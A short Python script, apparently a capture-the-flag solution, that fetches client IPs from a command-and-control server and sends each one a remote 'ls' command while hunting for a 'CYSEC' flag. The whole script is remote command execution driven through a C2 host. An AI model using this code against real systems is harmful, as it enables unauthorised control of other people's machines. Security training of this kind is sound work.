import requests

clientListingURL = "https://cc.attacking.systems/?command=list"

def getClientIPs():
    r = requests.get(clientListingURL)
    return r.text.split("\n")

def sendCommand(command):
    r = requests.get("https://cc.attacking.systems/?command="+command)
    return r.text

def main():
    clientIPs = getClientIPs()
    #print("Client IPs: " + str(clientIPs))
    for clientIP in clientIPs:
        res = sendCommand("run " + clientIP + " ls")
        if res.__contains__("CYSEC"):
            print("Found CYSEC flag on " + clientIP)
            print(res)


if __name__ == "__main__":
    main()